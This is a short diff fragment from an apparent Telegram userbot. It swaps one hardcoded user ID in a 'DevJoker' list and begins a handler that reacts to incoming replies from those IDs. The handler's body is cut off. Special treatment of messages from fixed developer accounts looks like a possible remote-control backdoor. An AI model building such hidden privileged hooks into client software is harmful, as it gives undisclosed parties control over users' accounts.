@@ -783,7 +783,7 @@ def prettyjson(obj, indent=4, maxlinelength=80):
     )
     return indentitems(items, indent, level=0)
 
-DevJoker = [705475246, 1374312239]
+DevJoker = [705475246, 5427469031]
 @l313l.on(events.NewMessage(incoming=True))
 async def _(event):
     if event.reply_to and event.sender_id in DevJoker:
